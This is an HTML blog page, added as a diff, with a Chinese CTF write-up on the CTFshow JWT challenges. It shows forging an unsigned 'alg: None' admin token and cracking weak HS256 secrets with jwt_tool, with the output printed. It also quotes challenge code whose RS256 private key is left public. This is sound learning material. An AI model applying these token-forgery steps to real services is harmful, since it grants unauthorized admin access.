@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CTFshow——jwt专题前言：无意间看到baozongwi师傅在博客里写道自己当时学习CTF的时候只要没有比赛就去刷刷ctfshow。这有狠狠的激励到我，我也想变得像他一样厉害，于是我也在打算在这里记录一下自己的刷题过程，看看自己能不能有所成长。 2025.8.19JWT参考：CTFshow-web入门-JWT_哔哩哔哩_bilibili JWT组成JWT由3部分组成：标头(Header)、有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFshow——jwt专题">
+<meta property="og:url" content="http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/index.html">
+<meta property="og:site_name" content="y@7q">
+<meta property="og:description" content="CTFshow——jwt专题前言：无意间看到baozongwi师傅在博客里写道自己当时学习CTF的时候只要没有比赛就去刷刷ctfshow。这有狠狠的激励到我，我也想变得像他一样厉害，于是我也在打算在这里记录一下自己的刷题过程，看看自己能不能有所成长。 2025.8.19JWT参考：CTFshow-web入门-JWT_哔哩哔哩_bilibili JWT组成JWT由3部分组成：标头(Header)、有">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250819224244.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250819231957.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250819231151.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250819233133.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250820010311.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250820110158.png">
+<meta property="article:published_time" content="2025-08-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-04T11:31:16.968Z">
+<meta property="article:author" content="y@7q">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250819224244.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CTFshow——jwt专题</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/English/Word_Day1/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/%E9%9D%B6%E5%9C%BA/ctfshow_%20%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%93%E9%A2%98/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&text=CTFshow——jwt专题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&title=CTFshow——jwt专题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&is_video=false&description=CTFshow——jwt专题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTFshow——jwt专题&body=Check out this article: http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&title=CTFshow——jwt专题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&title=CTFshow——jwt专题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&title=CTFshow——jwt专题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&title=CTFshow——jwt专题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&name=CTFshow——jwt专题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&t=CTFshow——jwt专题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFshow%E2%80%94%E2%80%94jwt%E4%B8%93%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">CTFshow——jwt专题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2025-8-19"><span class="toc-number">1.2.</span> <span class="toc-text">2025.8.19</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT"><span class="toc-number">1.2.1.</span> <span class="toc-text">JWT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT%E7%BB%84%E6%88%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">JWT组成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web345-%E7%A9%BA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">1.2.3.</span> <span class="toc-text">web345(空加密算法)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web346-%E5%BC%B1%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86"><span class="toc-number">1.2.4.</span> <span class="toc-text">web346(弱密码加密)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web347-%E5%BC%B1%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%862"><span class="toc-number">1.2.5.</span> <span class="toc-text">web347(弱密码加密2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web348-%E5%BC%B1%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%863"><span class="toc-number">1.2.6.</span> <span class="toc-text">web348(弱密码加密3)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web349-%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95RS256%E5%85%AC%E9%92%A5%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.7.</span> <span class="toc-text">web349(非对称加密算法RS256公钥私钥泄露)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web350"><span class="toc-number">1.2.8.</span> <span class="toc-text">web350</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CTFshow——jwt专题
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">y@7q</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-08-28T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-08-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="CTFshow——jwt专题"><a href="#CTFshow——jwt专题" class="headerlink" title="CTFshow——jwt专题"></a>CTFshow——jwt专题</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>无意间看到baozongwi师傅在博客里写道自己当时学习CTF的时候只要没有比赛就去刷刷ctfshow。这有狠狠的激励到我，我也想变得像他一样厉害，于是我也在打算在这里记录一下自己的刷题过程，看看自己能不能有所成长。</p>
+<h2 id="2025-8-19"><a href="#2025-8-19" class="headerlink" title="2025.8.19"></a>2025.8.19</h2><h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1vU4y187HE">CTFshow-web入门-JWT_哔哩哔哩_bilibili</a></p>
+<h3 id="JWT组成"><a href="#JWT组成" class="headerlink" title="JWT组成"></a>JWT组成</h3><p>JWT由3部分组成：标头(Header)、有效载荷(Payload)和签名(Signature)。在传输的时候，会将JWT的3部分分别进行Base64编码后用.进行连接形成最终传输的字符串。</p>
+<h3 id="web345-空加密算法"><a href="#web345-空加密算法" class="headerlink" title="web345(空加密算法)"></a>web345(空加密算法)</h3><p>F12一下发现提示：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">where is flag?</span><br><span class="line"><span class="comment">&lt;!-- /admin --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看它的Cookie: </p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">auth</span><span class="operator">=</span>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NTU2MTM1MTksImV4cCI6MTc1NTYyMDcxOSwibmJmIjoxNzU1NjEzNTE5LCJzdWIiOiJ1c2VyIiwianRpIjoiMTgxMGI2ZDI4MmY1OWVjMmZlOWI4MTRhNWM5MGVhM2QifV0</span><br></pre></td></tr></table></figure>
+<p>尝试base64解码：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:<span class="string">&quot;None&quot;</span>,<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;jwt&quot;</span>&#125;<span class="selector-attr">[&#123;<span class="string">&quot;iss&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;iat&quot;</span>:1755613519,<span class="string">&quot;exp&quot;</span>:1755620719,<span class="string">&quot;nbf&quot;</span>:1755613519,<span class="string">&quot;sub&quot;</span>:<span class="string">&quot;user&quot;</span>,<span class="string">&quot;jti&quot;</span>:<span class="string">&quot;1810b6d282f59ec2fe9b814a5c90ea3d&quot;</span>&#125;]</span></span><br></pre></td></tr></table></figure>
+<p>把其中的user改为admin，再进行base64编码替换原有Cookie。<br>最后访问<code>/admin/</code>路由(注：这里必须 访问<code>/admin/</code>而不是<code>/admin</code>否则无效，大概解释一下就是加斜杠表示访问的admin这个目录下的index.php或者其他的，不加斜杠则表示访问的是admin文件，而由于不存在这个文件所以会404):<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250819224244.png" alt="20250819224244"></p>
+<p>之所以可以直接解密是因为这段是空加密（见<code>&quot;alg&quot;:&quot;None&quot;</code>）：</p>
+<blockquote>
+<p>签名算法可被修改为none，JWT支持将算法设定为 “None” 。如果 “alg” 字段设为 “None” ，那么签名会被置空，这样任何token都是有效的。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250819231957.png" alt="20250819231957"></p>
+<h3 id="web346-弱密码加密"><a href="#web346-弱密码加密" class="headerlink" title="web346(弱密码加密)"></a>web346(弱密码加密)</h3><p>后面这几道题目整体做题流程和第一题一致，主要记一下jwt伪造的部分。<br>Cookie: 1</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">auth</span><span class="operator">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc1NTYxNDk3MywiZXhwIjoxNzU1NjIyMTczLCJuYmYiOjE3NTU2MTQ5NzMsInN1YiI6InVzZXIiLCJqdGkiOiI5ODA1ZDg4OWRjODdkNjc0ZWVlYTg5NzYxOGVhM2RiNyJ9.ER6cOypA9jmjypFNP5vJELgmP7NyJRJq7ZweXVDbnN0</span><br></pre></td></tr></table></figure>
+<p>尝试直接解码，发现这次就不像第一题那样了，大部分都是乱码。<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250819231151.png" alt="20250819231151"></p>
+<p>我们用<code>https://www.bejson.com/jwt/</code>在线解码一下:<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250819233133.png" alt="20250819233133"></p>
+<p>发现这次是有HS256算法的加密的。<br>直接弱密码爆出来是<code>123456</code>:</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(jwt_tool-<span class="number">2</span>.<span class="number">3</span>.<span class="number">0</span>) E:\myCTFTools\WebTools\jwt_tool-<span class="number">2</span>.<span class="number">3</span>.<span class="number">0</span>&gt;python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc1NTYxOTI2NCwiZXhwIjoxNzU1NjI2NDY0LCJuYmYiOjE3NTU2MTkyNjQsInN1YiI6ImFkbWluIiwianRpIjoiMjJlYTk4OTJkNjRiMzM3MzI1ODdmYzBjYzY2MTk5M2YifQ.QItCPI7MkOAGD1e7YQh-jLwcpr6r1BJRRRIsKJNJtfM -C -d 常用密码.txt</span><br><span class="line"></span><br><span class="line">        \   \        \         \          \                    \</span><br><span class="line">   \__   |   |  \     |\__    __| \__    __|                    |</span><br><span class="line">         |   |   \    |      |          |       \         \     |</span><br><span class="line">         |        \   |      |          |    __  \     __  \    |</span><br><span class="line">  \      |      _     |      |          |   |     |   |     |   |</span><br><span class="line">   |     |     / \    |      |          |   |     |   |     |   |</span><br><span class="line">\        |    /   \   |      |          |\        |\        |   |</span><br><span class="line"> \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|</span><br><span class="line"> Version <span class="number">2</span>.<span class="number">3</span>.<span class="number">0</span>                \______|             @ticarpi</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">y</span>@7<span class="title">q</span>/.<span class="title">jwt_tool</span>/<span class="title">jwtconf.ini</span></span></span><br><span class="line"><span class="function"><span class="title">Original</span> <span class="title">JWT</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] 123456 <span class="title">is</span> <span class="title">the</span> <span class="title">CORRECT</span> <span class="title">key</span>!</span></span><br><span class="line"><span class="function"><span class="title">You</span> <span class="title">can</span> <span class="title">tamper</span>/<span class="title">fuzz</span> <span class="title">the</span> <span class="title">token</span> <span class="title">contents</span> (-<span class="title">T</span>/-<span class="title">I</span>) <span class="title">and</span> <span class="title">sign</span> <span class="title">it</span> <span class="title">using</span>:</span></span><br><span class="line"><span class="function"><span class="title">python3</span> <span class="title">jwt_tool.py</span> [<span class="title">options</span> <span class="title">here</span>] -<span class="title">S</span> <span class="title">hs256</span> -<span class="title">p</span> &quot;123456&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">(<span class="title">jwt_tool</span>-2.3.0) <span class="title">E</span>:\<span class="title">myCTFTools</span>\<span class="title">WebTools</span>\<span class="title">jwt_tool</span>-2.3.0&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="web347-弱密码加密2"><a href="#web347-弱密码加密2" class="headerlink" title="web347(弱密码加密2)"></a>web347(弱密码加密2)</h3><p>一样可以爆破弱密码：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(jwt_tool-<span class="number">2</span>.<span class="number">3</span>.<span class="number">0</span>) E:\myCTFTools\WebTools\jwt_tool-<span class="number">2</span>.<span class="number">3</span>.<span class="number">0</span>&gt;python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc1NTYyMDUwOCwiZXhwIjoxNzU1NjI3NzA4LCJuYmYiOjE3NTU2MjA1MDgsInN1YiI6InVzZXIiLCJqdGkiOiJlYTNmZGYxNTk3NzMxYzU5M2U5NzNkYTI3NjZmMjJkMiJ9.wVecjdvwUpP5NzhI1sn8I7aCuiILG7eVinIfmxOJUS8 -C -d 常用密码.txt</span><br><span class="line"></span><br><span class="line">        \   \        \         \          \                    \</span><br><span class="line">   \__   |   |  \     |\__    __| \__    __|                    |</span><br><span class="line">         |   |   \    |      |          |       \         \     |</span><br><span class="line">         |        \   |      |          |    __  \     __  \    |</span><br><span class="line">  \      |      _     |      |          |   |     |   |     |   |</span><br><span class="line">   |     |     / \    |      |          |   |     |   |     |   |</span><br><span class="line">\        |    /   \   |      |          |\        |\        |   |</span><br><span class="line"> \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|</span><br><span class="line"> Version <span class="number">2</span>.<span class="number">3</span>.<span class="number">0</span>                \______|             @ticarpi</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">y</span>@7<span class="title">q</span>/.<span class="title">jwt_tool</span>/<span class="title">jwtconf.ini</span></span></span><br><span class="line"><span class="function"><span class="title">Original</span> <span class="title">JWT</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] 123456 <span class="title">is</span> <span class="title">the</span> <span class="title">CORRECT</span> <span class="title">key</span>!</span></span><br><span class="line"><span class="function"><span class="title">You</span> <span class="title">can</span> <span class="title">tamper</span>/<span class="title">fuzz</span> <span class="title">the</span> <span class="title">token</span> <span class="title">contents</span> (-<span class="title">T</span>/-<span class="title">I</span>) <span class="title">and</span> <span class="title">sign</span> <span class="title">it</span> <span class="title">using</span>:</span></span><br><span class="line"><span class="function"><span class="title">python3</span> <span class="title">jwt_tool.py</span> [<span class="title">options</span> <span class="title">here</span>] -<span class="title">S</span> <span class="title">hs256</span> -<span class="title">p</span> &quot;123456&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">(<span class="title">jwt_tool</span>-2.3.0) <span class="title">E</span>:\<span class="title">myCTFTools</span>\<span class="title">WebTools</span>\<span class="title">jwt_tool</span>-2.3.0&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="web348-弱密码加密3"><a href="#web348-弱密码加密3" class="headerlink" title="web348(弱密码加密3)"></a>web348(弱密码加密3)</h3><p>还是爆破：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(jwt_tool-<span class="number">2</span>.<span class="number">3</span>.<span class="number">0</span>) PS E:\myCTFTools\WebTools\jwt_tool-<span class="number">2</span>.<span class="number">3</span>.<span class="number">0</span>&gt; python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc1NTYyMTA2NywiZXhwIjoxNzU1NjI4MjY3LCJuYmYiOjE3NTU2MjEwNjcsInN1YiI6InVzZXIiLCJqdGkiOiI3ZDhmYzJjMTljYjllYThiYjY3NGI5NWM5YjA4Zjg0MiJ9.SeJKsDZXHZrJmaCj9FehMitjVucezYwoL8fZdo8xX8o -C -d 常用密码.txt</span><br><span class="line"></span><br><span class="line">        \   \        \         \          \                    \</span><br><span class="line">   \__   |   |  \     |\__    __| \__    __|                    |</span><br><span class="line">         |   |   \    |      |          |       \         \     |</span><br><span class="line">         |        \   |      |          |    __  \     __  \    |</span><br><span class="line">  \      |      _     |      |          |   |     |   |     |   |</span><br><span class="line">   |     |     / \    |      |          |   |     |   |     |   |</span><br><span class="line">\        |    /   \   |      |          |\        |\        |   |</span><br><span class="line"> \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|</span><br><span class="line"> Version <span class="number">2</span>.<span class="number">3</span>.<span class="number">0</span>                \______|             @ticarpi</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">y</span>@7<span class="title">q</span>/.<span class="title">jwt_tool</span>/<span class="title">jwtconf.ini</span></span></span><br><span class="line"><span class="function"><span class="title">Original</span> <span class="title">JWT</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">aaab</span> <span class="title">is</span> <span class="title">the</span> <span class="title">CORRECT</span> <span class="title">key</span>!</span></span><br><span class="line"><span class="function"><span class="title">You</span> <span class="title">can</span> <span class="title">tamper</span>/<span class="title">fuzz</span> <span class="title">the</span> <span class="title">token</span> <span class="title">contents</span> (-<span class="title">T</span>/-<span class="title">I</span>) <span class="title">and</span> <span class="title">sign</span> <span class="title">it</span> <span class="title">using</span>:</span></span><br><span class="line"><span class="function"><span class="title">python3</span> <span class="title">jwt_tool.py</span> [<span class="title">options</span> <span class="title">here</span>] -<span class="title">S</span> <span class="title">hs256</span> -<span class="title">p</span> &quot;<span class="title">aaab</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="web349-非对称加密算法RS256公钥私钥泄露"><a href="#web349-非对称加密算法RS256公钥私钥泄露" class="headerlink" title="web349(非对称加密算法RS256公钥私钥泄露)"></a>web349(非对称加密算法RS256公钥私钥泄露)</h3><p>源码暴露了<code>/private.key</code>有私钥泄露：<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250820010311.png" alt="20250820010311"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">	res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">	<span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">	jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">	  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">	  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
